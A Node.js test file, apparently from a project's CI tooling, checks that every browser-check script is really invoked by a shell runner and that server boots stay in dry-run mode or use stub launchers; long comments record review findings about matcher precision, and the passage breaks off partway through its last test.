'use strict';

/**
 * Every browser check in docs/browser-checks/ is actually RUN by the runner.
 *
 * 🛑 WHY (#1387). Ten of fifty-eight checks were never referenced by
 * `tools/browser-checks.sh`, and FOUR of them had been written the same day to
 * guard fixes Josh had asked for. The author wrote the check, the check does
 * not run, and NOTHING ANYWHERE SAYS SO. A directory listing shows 58; the
 * gate runs 48.
 *
 * ⭐ AN UNRUN CHECK READS AS COVERAGE. That is the whole defect, and it is the
 * same one `tools.every-test-runs.test.js` fixes for `tools/test-*.sh`. This
 * file is that test's sibling, deliberately shaped the same way, because the
 * population is different and the principle is identical.
 *
 * 🔑 THE DURABLE HALF IS THIS FILE, NOT THE WIRING. Wiring the nine fixes
 * today. This fixes the next one.
 *
 *   node --test tools.browser-checks-wired.test.js
 */
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');

const DIR = 'docs/browser-checks';
const RUNNER = 'tools/browser-checks.sh';

/**
 * 🛑 COMMENT LINES ARE STRIPPED, AND THAT IS NOT A DETAIL.
 *
 * The runner discusses checks in prose: `render-projects` appears on four
 * lines and is EXECUTED on one. A bare substring match over the whole file
 * counts a check that is only TALKED ABOUT as wired - which is exactly the
 * mention-versus-execution error `tools.every-test-runs.test.js` was written
 * about, and I made it myself in the first sweep for this card.
 *
 * ⚠️ AND THE OPPOSITE ERROR IS EQUALLY EASY. Matching only
 * `node docs/browser-checks/X.js` looks rigorous and MISSES SIXTEEN checks
 * that are run by a loop at line 641 (`run_one "$n" node "docs/browser-checks/$n.js"`).
 * Measured: that pattern reported 16 checks as never-run which run on every
 * gate. An over-narrow pattern and an over-broad one, in the same measurement,
 * in opposite directions.
 *
 * ⇒ Stripping FULL-LINE comments and then matching the basename handles both
 * invocation forms and excludes prose. A trailing comment on a real command
 * line still counts as code, which is correct: the command on it runs.
 */
function runnerCode() {
  return fs.readFileSync(RUNNER, 'utf8')
    .split('\n')
    .filter((l) => !/^\s*#/.test(l))
    .join('\n');
}

/**
 * A LIBRARY, not a check, and the exemption is EARNED rather than assumed.
 *
 * `lib-sandbox-guard.js` is required by five checks and exports a function; it
 * is correctly absent from the runner because nothing should invoke it
 * directly. ⚠️ The card that prompted this file listed it as a tenth unwired
 * check with "may be a library, needs a look" - so the look is this function,
 * and it keys on `module.exports` rather than on the `lib-` prefix, because a
 * name is a convention and an export is a fact.
 */
function isLibrary(file) {
  return fs.readFileSync(path.join(DIR, file), 'utf8').includes('module.exports');
}

/**
 * 🛑 A BOUNDARY, NOT A SUBSTRING, AND `String.includes` WAS WRONG (Ice Cream
 * Kitty, cross-review of #1424).
 *
 * `render-talk` is a PREFIX of `render-talk-search`. Both are wired today via
 * the stem loop, so nothing is broken right now - but delete the standalone
 * `render-talk` token from that list and the check stops running while this
 * test still reports it WIRED, because its stem occurs inside its neighbour.
 *
 * ⇒ A check that stops running reads as covered, which is the exact defect this
 * file exists to prevent, reachable by deleting one word.
 *
 * ⭐ AND MY CONTROLS COULD NOT HAVE CAUGHT IT, which is the more useful half of
 * her finding: `render-projects` present and `zzz-not-a-real-check` absent both
 * pass under the bug, because the fault is in the matcher's PRECISION and a
 * control tests its LIVENESS. **A control proves an instrument is not dead. It
 * cannot prove it is not over-eager.**
 *
 * 🛑 SUPERSEDED THE SAME DAY, AND KITTY RETRACTED THE SCOPE HERSELF BEFORE
 * ANYBODY ASKED: "my boundary fix closes the COLLISION and does not make the
 * matcher precise. A name in a loop body still reads as wired."
 *
 * ⇒ SO DO NOT READ THIS BLOCK AS DESCRIBING THE MATCHER BELOW. It no longer
 * uses a boundary regex at all. It is kept because the REASONING is the reason
 * the file ended up position-aware, and because deleting the history would
 * leave the next person to rediscover the collision from scratch.
 *
 * ⭐ The half that generalises, and it outlived the fix it was written for: a
 * control proves an instrument is not DEAD; it cannot prove it is not
 * OVER-EAGER. Both of Kitty's attacks and Mona Lisa's passed every control
 * this file had.
 */
/* 🛑 THIS ASKS ABOUT POSITION, NOT PRESENCE, AND THE DIFFERENCE IS THE WHOLE
   GUARD. Two people attacked the presence form on 2026-08-28 and both got
   through, from opposite directions:

     Ice Cream Kitty  a name that is a PREFIX of a wired name reads as wired
     Mona Lisa        a name in the LOOP BODY instead of the loop LIST:

         for n in ... render-model-change; do   ->   for n in ...; do render-model-change
           run_one "$n" ...                              run_one "$n" ...
         done                                          done

   Her state parses (`bash -n` clean), runs the name as a command once per
   iteration, fails as command-not-found, and NEVER RUNS THE CHECK. The merged
   guard said 4 pass 0 fail over it.

   ⭐ Kitty's boundary fix closed the collision and she said so herself: it does
   not make the matcher precise. Tightening a text match answers "does this
   name appear". The card asks "will this check run". NO AMOUNT OF REGEX
   CONVERTS THE FIRST QUESTION INTO THE SECOND, which is why this stops
   patching the matcher and reads the three positions that actually invoke:

     1. run_one "<name>"                     explicit
     2. a `for n in <list>; do` whose BODY calls run_one   the stem loop
     3. node docs/browser-checks/<name>.js   direct launch

   ⚠️ POSITION 3 IS NOT DECORATION AND I NEARLY SHIPPED WITHOUT IT. My first
   version knew only 1 and 2, and it reported `thread-server` unwired. That is
   wrong: it is the helper server `render-thread` needs, launched at :304 with
   a plain backgrounded `node`. A stricter instrument that does not know every
   real mechanism MANUFACTURES A FALSE ALARM, which costs somebody an
   afternoon exactly as a false pass does.

   📌 There is a fourth `for n in` in the runner that must NOT count: the
   "server did not boot" branch, which lists 14 names only to push them onto
   FAILED. Keying on run_one in the body is what excludes it.

   🛑 THE LIMIT OF THIS FILE, AND IT IS ONE RUNG SHORT OF WHAT I FIRST CLAIMED
   (Mona Lisa, cross-review of #1439). I wrote that presence asks "does this
   name appear" and the card asks "will this check run".

   THAT IS AN OVER-CLAIM. POSITION ANSWERS "IS IT INVOKED IN THE SOURCE". IT
   DOES NOT ANSWER "DID IT RUN." A `run_one` sitting inside
   `if boot_board_rich ...; then` is positioned perfectly and executes only if
   that boot succeeds. Three rungs, not two:

     presence   the name is in the file          defeated by a loop body
     position   the name is in an invoking slot  THIS FILE. Cannot see a
                                                 guard that never opened.
     execution  the harness's own `ran:` line    the only one keyed on
                                                 something actually running

   ⚠️ AND THE THIRD RUNG IS NOT AVAILABLE HERE, which is why this is a stated
   limit and not a TODO: `ran:` needs a real gate run and is frozen at one
   commit, so it can never be a unit test. She measured it rather than
   proposing it - 50 expected, 47 ran, all three differences explained against
   the tree her run froze, no live gap. ⇒ It COMPLEMENTS this file. Where it
   belongs is a post-gate assertion in the release, not here. */
function invokedNames(code) {
  const names = new Set();
  for (const m of code.matchAll(/run_one\s+"([^"]+)"/g)) names.add(m[1]);
  for (const loop of code.matchAll(/for n in ([^;]+); do([\s\S]*?)done/g)) {
    if (!/run_one/.test(loop[2])) continue;
    for (const n of loop[1].trim().split(/\s+/)) names.add(n);
  }
  for (const m of code.matchAll(/node\s+docs\/browser-checks\/([a-z0-9-]+)\.js/g)) names.add(m[1]);
  return names;
}

function wiredIn(code, stem) {
  return invokedNames(code).has(stem);
}

function checkFiles() {
  return fs.readdirSync(DIR).filter((f) => f.endsWith('.js')).sort();
}

/**
 * Checks that exist and are deliberately NOT wired. Each needs a reason, and
 * the reason has to be a real cost rather than a preference.
 *
 * 🛑 THIS LIST IS THE DANGEROUS PART OF THIS FILE, exactly as the allowlist in
 * `tools.every-test-runs.test.js` is of that one. It is the documented way to
 * make a guard stop guarding.
 *
 * ⚠️ IT IS A DEBT LIST, NOT A DESIGN. Every entry below is a check somebody
 * wrote to guard something and which has never once run. They are here so the
 * number is VISIBLE and shrinking, instead of being invisible and growing,
 * which is the state #1387 found. Wiring them is its own work with its own
 * risk: nine checks that have never executed may encode intent the shipped
 * code never matched, and turning the gate red on all nine at once during a
 * release window is a bad trade.
 *
 * ✅ Deleting a line from here is the only correct direction of travel.
 */
const NOT_WIRED = {
  'render-conn-url.js': 'never wired.',
  'render-openai-key-step.js': 'never wired.',
  'render-openai-step.js': 'never wired.',
  'render-sleep-button.js': 'never wired.',
  'render-special-purpose.js': 'never wired.',
};

/* 🔑 A FLOOR ON THE POPULATION, the same reason its sibling has one. If the
   directory read came back empty this file would pass by finding nothing to
   check, which is the failure mode it exists to prevent. */
test('#1387: the instrument is reading something', () => {
  const found = checkFiles();
  assert.ok(found.length >= 40,
    `only ${found.length} ${DIR}/*.js found; the directory read looks broken, and every assertion below would pass for the wrong reason`);
  const code = runnerCode();
  assert.ok(code.length > 1000, `${RUNNER} read as ${code.length} chars after stripping comments; the runner read looks broken`);
  /* AND THE MATCHER CAN SAY BOTH THINGS. A discriminator that only ever says
     "wired" would pass this whole file silently. */
  assert.ok(wiredIn(code, 'render-projects'), 'the matcher cannot find a check it should find');
  assert.ok(!wiredIn(code, 'zzz-not-a-real-check'), 'the matcher finds a name that does not exist');
  /* 🔑 AND THE PRECISION ARM, which the two above cannot supply: a stem that
     occurs only INSIDE another name must not read as wired. Without this the
     matcher can be reverted to `includes` and every other assertion still
     passes. */
  assert.ok(!wiredIn('run_one "render-talk-search" node x', 'render-talk'),
    'the matcher counts a name as wired when only a LONGER name containing it is present');

  /* 🔑 THE POSITION ARMS (Mona Lisa, 2026-08-28). The two arms above are both
     satisfied by a name sitting anywhere in the file, so neither can tell a
     list item from a loop-body command. This is the state she actually
     produced: valid shell, `bash -n` clean, check never runs.

     ⚠️ OF THE FOUR ASSERTIONS BELOW, ONLY TWO DISCRIMINATE, and she checked
     that rather than taking my word for the count:

       inList 'beta' TRUE          passes on reverted code too   liveness
       inBody 'beta' FALSE         DISCRIMINATES
       FAILED 'gamma' FALSE        DISCRIMINATES
       thread-server TRUE          passes on reverted code too   liveness

     The two liveness arms are correct to keep - they are what stops a matcher
     that only ever says "no" from passing this file silently. They are labelled
     so nobody reads the discriminating pair as four. */
  const inList = 'for n in alpha beta; do\n  run_one "$n" node x\ndone';
  const inBody = 'for n in alpha; do beta\n  run_one "$n" node x\ndone';
  assert.ok(wiredIn(inList, 'beta'), 'a name in the for-LIST must count as invoked');
  assert.ok(!wiredIn(inBody, 'beta'),
    'a name in the loop BODY reads as wired; it runs as a command, fails command-not-found, and the check never executes');

  /* 🔑 AND THE FAILED-LIST ARM. The runner has a `for n in <14 names>` whose
     body only pushes onto FAILED when the server did not boot. Being named
     there is the OPPOSITE of being run, so it must confer nothing. */
  assert.ok(!wiredIn('for n in gamma; do FAILED+=("$n (server did not boot)"); done', 'gamma'),
    'a name listed only in the server-did-not-boot FAILED branch counts as invoked');

  /* 🔑 DIRECT LAUNCH. thread-server is real and is started this way, not via
     run_one. Without this the guard reports a live helper as unwired. */
  assert.ok(wiredIn('PORT="$p" node docs/browser-checks/thread-server.js > log 2>&1 &', 'thread-server'),
    'a check launched directly by node, not via run_one, reads as unwired');
});

test('#1387: every browser check is RUN by the runner, or is listed as unwired with a reason', () => {
  const code = runnerCode();
  const orphans = [];
  for (const f of checkFiles()) {
    if (isLibrary(f)) continue;
    if (Object.prototype.hasOwnProperty.call(NOT_WIRED, f)) continue;
    if (!wiredIn(code, f.replace(/\.js$/, ''))) orphans.push(f);
  }
  assert.deepEqual(orphans, [],
    `these checks exist and are never run by ${RUNNER}, and nothing else would tell you:\n  ${orphans.join('\n  ')}\n`
    + 'Wire them, or add them to NOT_WIRED with a reason that is a real cost.');
});

/* 🛑 THE LIST MUST SHRINK, NEVER SILENTLY ROT. An entry that has since been
   wired is a lie the next reader inherits, and it would let a genuinely
   unwired check hide behind a stale line. */
test('#1387: nothing in NOT_WIRED is actually wired, and nothing in it has been deleted', () => {
  const code = runnerCode();
  /* Boundary here too: a NOT_WIRED name that is a substring of a wired one
     would otherwise read as "since wired" and fail spuriously - the same bug
     in the opposite direction. */
  const stale = Object.keys(NOT_WIRED).filter((f) => wiredIn(code, f.replace(/\.js$/, '')));
  assert.deepEqual(stale, [],
    `these are listed as unwired but the runner DOES run them; delete their lines:\n  ${stale.join('\n  ')}`);
  const missing = Object.keys(NOT_WIRED).filter((f) => !fs.existsSync(path.join(DIR, f)));
  assert.deepEqual(missing, [],
    `these are listed as unwired but no longer exist; delete their lines:\n  ${missing.join('\n  ')}`);
});

/* The library exemption is earned, not asserted. If nothing requires it, it is
   not a library and it should be wired or listed like everything else. */
test('#1387: a file exempted as a library is actually required by a check', () => {
  const libs = checkFiles().filter(isLibrary);
  assert.ok(libs.length >= 1, 'no libraries found; if that is right, delete this test rather than letting it pass vacuously');
  for (const lib of libs) {
    const base = lib.replace(/\.js$/, '');
    const users = checkFiles().filter((f) => f !== lib
      && fs.readFileSync(path.join(DIR, f), 'utf8').includes(base));
    assert.ok(users.length >= 1,
      `${lib} is exempted as a library but no check requires it, so the exemption is unearned`);
  }
});

/**
 * #1575: every `node ./server.js` boot site sets AGENT_WORKFORCE_DRY_RUN, EXCEPT the
 * two #1573 boards, which carry a stub launcher instead.
 *
 * 🛑 WHY THIS EXISTS, AND IT IS THE POINT OF THE CARD IT COMES FROM. A comment in
 * `tools/browser-checks.sh` claimed B8 ran WITHOUT dry-run. It was false, nothing
 * tested it, nothing went red when it rotted, and it misled a review of #1573 before
 * anybody noticed. The correction replaced a false universal with a TRUE one, and a
 * true universal that nothing guards is the same construction: it rots the moment
 * somebody adds a seventh boot site, silently, exactly as the first one did.
 *
 * ⇒ A COMMENT CANNOT BE TESTED. THE FACT UNDER IT CAN.
 *
 * ⚠️ Scoped to `node ./server.js` deliberately. `boot_thread_server` boots
 * `thread-server.js` and sets no dry-run, which is correct for it, so the looser
 * "every server boot" would be false. That scoping is the difference between a true
 * statement and the one this card removed.
 */
test('#1575: every `node ./server.js` boot sets AGENT_WORKFORCE_DRY_RUN, or is a #1573 stub board', () => {
  const src = fs.readFileSync(RUNNER, 'utf8');
  const lines = src.split('\n');
  const boots = [];
  lines.forEach((line, i) => {
    /* ⚠️ ANY SPELLING OF THE BOOT, NOT ONE. This keyed on the literal `node ./server.js`,
       so dropping the `./` made a boot INVISIBLE to the parser and the guard stayed green -
       measured by the fifth blind review, and it is the exact mistake the runner's own
       comment at 211-220 warns about. A guard you can evade by respelling the thing it
       looks for is pinned to a spelling, not to the rule. */
    /* ⚠️ AND QUOTED TOO. `node \"./server.js\"` was INVISIBLE here, so an eighth
       board pointing at a REAL binary held boots.length at 7 and the equality was
       satisfied while the board was never examined. The assertion message
       anticipated the count DROPPING and not a new invisible boot holding it
       steady, which is a floor failure wearing an equality. */
    if (!/node\s+["']?\.?\/?server\.js/.test(line)) return;
    if (/^\s*#/.test(line)) return;                 // prose about the boots, not a boot
    boots.push({ n: i + 1, line });
  });

  /* The instrument must be reading something: if this ever goes to zero the
     assertion below passes vacuously, which is the failure mode the whole file
     is about. */
  /* 🛑 EQUALITY, NOT A MINIMUM. A minimum cannot see a defect that INFLATES the
     population: it was calibrated at 6 when there were six boots, this diff adds a
     seventh, and the review measured that ONE boot could then be hidden with everything
     still green - two were needed before it fired. Equality fires in BOTH directions, so
     adding a board is a deliberate act that updates this number and re-reads the
     exemption, rather than something that slips underneath a floor. */
  const EXPECTED_BOOTS = 7;
  assert.strictEqual(boots.length, EXPECTED_BOOTS,
    `expected exactly ${EXPECTED_BOOTS} server boot sites, found ${boots.length}. If you added a `
    + 'board, raise this number and check its dry-run status deliberately; if it dropped, a boot '
    + 'has been spelled in a way the parser cannot see and is no longer being checked.');

  /* The env is a prefix spanning the lines above the invocation, so look back from
     each boot to the start of its command. */
  /* 🛑 THE TWO #1573 BOARDS OMIT DRY-RUN DELIBERATELY, and this is a NAMED
     exemption rather than a loosened assertion. The card's whole finding is that
     dry-run neutralises a subprocess by FAKING SUCCESS, which is what made the
     confirm-skip unobservable; those two boards neutralise it with a harmless stub
     instead. Widening this test to "most boots" would have thrown away the property
     it exists to hold.

     ⚠️ THIS GUARD CAUGHT #1573 WITHIN HOURS OF BEING MERGED, which is the argument
     for it: the sentence it protects would otherwise have gone false in silence, in
     exactly the way the sentence it replaced did. */
  /* ⚠️ A PATTERN, NOT A NAME, and the difference matters. This matches the
     stub-launcher assignment itself, so a third boot that copies that exact env line
     would also be exempted. That is narrow in practice (it takes a deliberate copy)
     ⚠️ AN EARLIER COMMENT HERE CLAIMED "deleting the stub takes this test red, because
     the exemption expires with its own justification". THAT WAS FALSE, AND FALSE IN THE
     REASSURING DIRECTION: the marker is the env ASSIGNMENT, so deleting the stub file,
     or replacing its body with `exec "$HOME/.local/bin/claude" "$@"`, left this green.
     A board that omits dry-run AND points at the operator's real Claude was exempt.

     ⇒ The property is now asserted rather than claimed, by the arm below. */
  const EXEMPT_MARKER = 'AGENT_WORKFORCE_CLAUDE_BIN="$_sb/fake-claude"';
  /* 🛑 THE EXEMPTION IS BOUNDED TO THE #1573 BLOCK, AND IT WAS NOT. Guard 3 asserts the
     stubs are real, but it only READS that block, while this guard exempted on the marker
     appearing ANYWHERE in the file. Measured: a boot placed outside the block, with no
     dry-run, no stub, and only the marker line copied into its env, was exempted here and
     never seen by guard 3. All seven green.

     ⇒ Two guards that disagree about WHICH BOOT they discuss leave a gap exactly the size
     of that disagreement. Bounding this one makes them talk about the same boots. */
  const blockStart = src.indexOf('#1573: the ONE PAIR OF BOARDS');
  const blockEnd = src.indexOf('render-connect-skip (a server did not boot)');
  assert.ok(blockStart > -1 && blockEnd > blockStart, 'the #1573 anchors moved; this guard reads nothing');
  const lineAt = (idx) => src.slice(0, idx).split('\n').length;
  const exemptFrom = lineAt(blockStart);
  const exemptTo = lineAt(blockEnd);
  const missing = boots.filter(({ n }) => {
    const insideExemptBlock = n >= exemptFrom && n <= exemptTo;
    let j = n - 1;
    let seen = false;
    for (let k = 0; k < 12 && j >= 0; k += 1, j -= 1) {
      const l = lines[j];
      /* ⚠️ THE CONTINUATION BREAK COMES FIRST, AND THE ORDER IS THE WHOLE FIX. With the
         marker checks above it, the first non-continuation line was still scanned, so a
         COMMENT mentioning either marker exempted a bare boot underneath it, and this
         file contains exactly that kind of prose. Measured both ways: with the checks
         first, a bare boot under a comment naming either marker was NOT reported; with
         the break first, it is. */
      if (j < n - 1 && !/\\\s*$/.test(l)) break;             // the command started above here
      if (insideExemptBlock && l.includes(EXEMPT_MARKER)) { seen = true; break; }  // #1573 boards only
      if (l.includes('AGENT_WORKFORCE_DRY_RUN=1')) { seen = true; break; }
    }
    return !seen;
  });

  assert.deepEqual(missing.map((m) => m.n), [],
    'a `node ./server.js` boot site neither sets AGENT_WORKFORCE_DRY_RUN=1 nor carries the #1573 '
    + 'stub-launcher marker, so the comment in browser-checks.sh describing that split is now false');
});

/**
 * #1573: only ONE check may run against the two non-dry-run boards, and it is the
 * read-only one.
 *
 * 🛑 THE RESTRICTION THAT CONTAINS THE HAZARD WAS PROSE WITH NO RUNNER. Those boards
 * omit AGENT_WORKFORCE_DRY_RUN, so `engine/create.js`'s run() no longer short-circuits
 * and a check that PRESSES A BUTTON there would really execute `launchctl bootstrap`
 * against the operator's own login session. The plist path is sandboxed; the launchd
 * registration is not (#1539).
 *
 * ⇒ A paragraph asking people not to do that is exactly the construction this file's
 * sibling test exists to replace. `$P14`/`$P15` are ordinary shell variables and
 * nothing went red if a second `run_one` was pointed at them. Now something does.
 *
 * ⚠️ This asserts the COUNT and the LABEL, not the content of the check. It cannot tell
 * whether `render-connect-skip` starts clicking things later; what it stops is the
 * cheap and likely mistake, which is someone reusing a conveniently-booted board.
 *
 * 🛑 THREE SPELLINGS OF THAT MISTAKE USED TO WALK STRAIGHT PAST IT, all measured green
 * by a blind review: the URL held in a variable (the file's own dominant style), the
 * check invoked directly without `run_one`, and a second check chained with `&&` on the
 * same continuation so the line count stayed at 1.
 *
 * 🛑 AND THAT LIST WAS ITSELF INCOMPLETE. An earlier version of this line ended
 * "All three now counted", which was true of a second `run_one` and FALSE of a
 * bare check chained onto a `run_one` line, because the counting branches were
 * mutually exclusive. A fourth blind review measured it GREEN with a check that
 * presses the real Create button. Counting is now per-fragment and additive.
 */
test('#1573: exactly one check runs against the non-dry-run boards, and it is the read-only one', () => {
  const src = fs.readFileSync(RUNNER, 'utf8');
  /* ⚠️ JOIN CONTINUATIONS FIRST. The invocation is written across two lines, with
     run_one on the first and the board URLs on the second, so a per-line filter
     demanding both finds ZERO and this assertion fails on a clean tree. It did
     exactly that on the first attempt, and the red baseline made the perturbation
     that followed prove nothing. */
  /* ⚠️ CARRY THE REAL SOURCE LINE THROUGH THE JOIN. An earlier version numbered the
     JOINED array, so a failure pointed at index 823 for a run_one that is at source line
     865, a 42-line offset that grows with every continuation above it. On a red gate that
     sends the reader to unrelated lines in an 880-line file. */
  const joined = [];
  let acc = '';
  let startLine = 1;
  src.split('\n').forEach((line, idx) => {
    if (acc === '') startLine = idx + 1;
    acc += line.replace(/\\\s*$/, ' ');
    if (!/\\\s*$/.test(line)) { joined.push({ line: acc, n: startLine }); acc = ''; }
  });
  /* ⚠️ RESOLVE ALIASES. A URL held in a variable - `BOK="http://127.0.0.1:$P14"` then
     `run_one ... "$BOK"` - evaded this completely, and that is not a contrived spelling:
     it is the file's DOMINANT style, written verbatim at 594-596 as `B8="http://..$P8"`
     for fourteen checks. So take one level of assignment and treat those names as naming
     these boards too. */
  const PORTS = /\$P1[45]\b|\$\{P1[45]\}/;
  const code = joined.filter(({ line }) => !/^\s*#/.test(line));
  /* 🛑 EVERY ASSIGNMENT ON THE LINE, NOT THE FIRST. `line.match` without /g reads one,
     and TWO ASSIGNMENTS ON ONE LINE IS THIS BLOCK'S OWN IDIOM - it opens with
     `sb_ok="$(new_sandbox)"; sb_bad="$(new_sandbox)"`. So `_junk=1; BOK="...$P14"`
     hid the alias completely while `BOK=` first on the line was caught. */
  const aliases = new Set();
  const checkVars = new Set();
  /* 🛑 TRANSITIVE, AND A `for` HEADER IS AN ASSIGNMENT TOO. The block's own loop reads
     `for _pair in "$sb_ok:$P14" "$sb_bad:$P15"` and then `_port="${_pair##*:}"`, so a
     check written inside the loop names `$_port` and NOTHING in a one-level, assignment-
     only resolver connects that back to $P14. A button-pressing check inside the loop
     therefore survived, which is exactly the hazard this guard exists to stop.
     ⇒ Resolve to a FIXPOINT: a name is an alias if its value mentions a port OR any name
     already known to be an alias. Iterating to convergence covers chains of any depth
     rather than the two I happened to find. */
  code.forEach(({ line }) => {
    for (const m of line.matchAll(/\bfor\s+([A-Za-z_][A-Za-z0-9_]*)\s+in\s+([^;]*)/g)) {
      if (PORTS.test(m[2])) aliases.add(m[1]);
    }
  });
  for (let pass = 0; pass < 8; pass += 1) {
    const before = aliases.size;
    code.forEach(({ line }) => {
      for (const m of line.matchAll(/(?:^|;|&&|\|\||\s)([A-Za-z_][A-Za-z0-9_]*)=("[^"]*"|\S*)/g)) {
        if ([...aliases].some((a) => new RegExp(`\\$\\{?${a}\\b`).test(m[2]))) aliases.add(m[1]);
      }
    });
    if (aliases.size === before) break;
  }
  code.forEach(({ line }) => {
    for (const m of line.matchAll(/(?:^|;|&&|\|\||\s)([A-Za-z_][A-Za-z0-9_]*)=("[^"]*"|\S*)/g)) {
      if (PORTS.test(m[2])) aliases.add(m[1]);
      /* ⚠️ AND A CHECK HELD IN A PATH VARIABLE. `CHK="docs/browser-checks/render-create-made"`
         then `node "$CHK.js"` was counted as ZERO invocations. */
      if (/docs\/browser-checks\//.test(m[2])) checkVars.add(m[1]);
    }
  });
  const namesBoard = (line) => PORTS.test(line)
    || [...aliases].some((a) => new RegExp(`\\$\\{?${a}\\b`).test(line));

  /* ⚠️ ANY INVOCATION OF A CHECK, NOT ONLY `run_one`. Running the script directly -
     `node docs/browser-checks/render-create-made.js "$URL"` - skipped this entirely, and
     render-create-made presses the real Create button. */
  /* ⚠️ AND COUNT OCCURRENCES, NOT LINES. Two checks chained with `&&` collapse into one
     joined entry, so a line count stayed at 1 while two checks ran. */
  const users = [];
  code.forEach(({ line, n }) => {
    if (!namesBoard(line)) return;
    /* An invocation needs a RUNNER on the line, which is what separates
       `CHK="docs/browser-checks/x"` (an assignment, invokes nothing) from
       `node "$CHK.js"` (an invocation). */
    if (!/(^|[;&|]|\s)(node|run_one)\b/.test(line)) return;
    /* 🛑 PER FRAGMENT, BECAUSE THE TWO BRANCHES WERE MUTUALLY EXCLUSIVE. This read
       `if (run_one) count run_one; else count paths`, so a line holding BOTH - a
       legitimate `run_one` with a second bare check chained onto it by `&&` - took the
       first branch and counted 1, silently discarding the chained invocation. Measured
       GREEN with `render-create-made` (which presses the real Create button) chained
       onto the render-connect-skip call.
       ⚠️ AND THE COMMENT ABOVE CLAIMED THIS VARIANT WAS ALREADY CLOSED. It said "a
       second check chained with && on the same continuation so the line count stayed at
       1. All three now counted." That was true of a second `run_one` and false of a
       chained bare invocation, which is the same "claims more than the code does" defect
       this file keeps closing, arriving inside the fix for it.
       ⇒ Split into command fragments and classify EACH, additively. Within a fragment
       the run_one-versus-path distinction still holds, so `run_one ... foo.js` counts
       once rather than twice. */
    let hits = 0;
    for (const frag of line.split(/&&|\|\||;/)) {
      if (/run_one/.test(frag)) {
        hits += (frag.match(/run_one/g) || []).length;
      } else {
        /* the DIRECTORY, not a literal filename: this counts a constructed path
           (`node "docs/browser-checks/$n.js"`) and a quoted one, which a `.js`-anchored
           pattern could not. */
        hits += (frag.match(/docs\/browser-checks\//g) || []).length;
        for (const v of checkVars) {
          hits += (frag.match(new RegExp(`\\$\\{?${v}\\b`, 'g')) || []).length;
        }
      }
    }
    for (let i = 0; i < hits; i += 1) users.push({ line, n });
  });

  assert.equal(users.length, 1,
    `expected exactly one check against the non-dry-run boards, found ${users.length}: `
    + `${users.map((u) => u.n).join(', ')}. Those boards omit AGENT_WORKFORCE_DRY_RUN, so a `
    + `check that presses a button there mutates the operator's real launchd (#1539). `
    + `Anything that clicks belongs on a dry-run board.`);

  assert.match(users[0].line, /render-connect-skip/,
    'the single check against the non-dry-run boards is no longer render-connect-skip; '
    + 'whatever replaced it must be read-only, and this assertion must be updated deliberately');
});

/**
 * #1573: the exempt boards' stubs must actually be STUBS.
 *
 * 🛑 WHY THIS EXISTS: I CLAIMED THIS PROPERTY AND DID NOT HAVE IT. The dry-run exemption
 * keys on the env ASSIGNMENT (`AGENT_WORKFORCE_CLAUDE_BIN="$_sb/fake-claude"`), so the
 * guard stayed GREEN when the stub file was deleted, and green when its body was replaced
 * with `exec "$HOME/.local/bin/claude" "$@"`. A board that omits dry-run AND hands the
 * probe to the operator's REAL Claude Code was exempt, which is the one case the
 * exemption must never cover.
 *
 * ⇒ The exemption now expires with its justification because THIS asserts the
 * justification, rather than a comment asserting that it does.
 *
 * ⚠️ Text-level, and that bound is worth stating: it cannot prove the stubs are harmless,
 * only that they are self-contained and present. It catches deletion and the passthrough
 * shapes, which are the ways this actually rots.
 */
test('#1573: the exempt boards ship self-contained stubs, not a passthrough to the real binaries', () => {
  const src = fs.readFileSync(RUNNER, 'utf8');
  const block = src.slice(src.indexOf('#1573: the ONE PAIR OF BOARDS'), src.indexOf('render-connect-skip (a server did not boot)'));
  /* ⚠️ BOTH ANCHORS ASSERTED, NOT JUST THE START. The end anchor is a user-visible
     failure string, so renaming it left this slice running to EOF while the suite stayed
     green: the guard silently widened instead of failing. An anchor that can vanish
     without a red is not an anchor. */
  assert.ok(src.indexOf('#1573: the ONE PAIR OF BOARDS') > -1, 'the #1573 start anchor is gone');
  assert.ok(src.indexOf('render-connect-skip (a server did not boot)') > -1,
    'the #1573 end anchor is gone, so this guard would read to end of file and pass vacuously');
  /* ⚠️ STRUCTURAL, NOT A CHARACTER COUNT. I first bounded this with `< 6000`, and my own
     comment additions pushed the block to 7137 within minutes: a magic number that goes
     stale as the file legitimately grows, which is the spelling-pin problem in another
     hat. The real question is "did the end anchor vanish so this slice ran to EOF", and
     that is answerable by content: the summary banner FOLLOWS the block, so seeing it
     here means the slice overran. */
  assert.ok(block.length > 500, 'the #1573 block is too short; the start anchor moved');
  assert.doesNotMatch(block, /sec "browser checks summary"/,
    'the #1573 slice extends past its end anchor and into the report, so this guard is reading '
    + 'far more of the file than it should and its assertions no longer mean what they say');

  /* 🛑 HOISTED, BECAUSE THE CREATE ASSERTION BELOW USED TO READ `block` AND A
     COMMENT SATISFIED IT. A line like `# ... > "$sb_ok/fake-claude"` made the guard
     green while the real creation was renamed away. The comment three lines below it
     claimed it "matches the WRITE and not the reference to it" - true of the redirect
     shape, false about which SOURCE it read. Use versus mention, a third time, and this
     time the mention was in my own prose. */
  const code = block.split('\n').filter((l) => !/^\s*#/.test(l)).join('\n');

  /* ⚠️ PIN THE RULE, NOT THE SPELLING. An earlier version of this asserted the heredoc
     MARKERS (`<<'STUBOK'`) and the exact string `AGENT_WORKFORCE_CODEX_BIN="$_sb/fake-codex"`.
     Both are spellings: renaming the stub file, or switching the heredoc to a printf,
     is a CORRECT change that would have turned this test red and told the author they
     had broken something. A pin on a spelling cements whatever the spelling currently
     is, including a wrong one.

     ⇒ The rule these boards must satisfy is: EACH LAUNCHER THE BOARD USES IS ROOTED IN
     ITS OWN SANDBOX, AND THIS BLOCK CREATES IT. That is what the assertions below read,
     by extracting whatever paths the env actually names. */
  const LAUNCHERS = [['CLAUDE', 'claude'], ['CODEX', 'codex']];
  /* 🛑 DERIVED FROM THE for-LIST, NOT HARDCODED. `['sb_ok','sb_bad']` was a literal, so a
     THIRD board appended to `for _pair in "$sb_ok:$P14" "$sb_bad:$P15"` was never looked
     for: its missing stub went unsought, and because that one line boots TWO servers, a
     boot-LINE equality cannot see a third either. The equality's own rationale - "adding
     a board is a deliberate act that updates this number" - was false for the only way
     this block actually adds boards.
     ⇒ Read the list. A board that exists is a board that gets checked. */
  const pairLine = block.match(/for\s+_pair\s+in\s+([^\n;]*)/);
  assert.ok(pairLine, 'the #1573 block no longer drives its boards from a `for _pair in` list, '
    + 'so this guard cannot enumerate them and every per-board assertion below is vacuous');
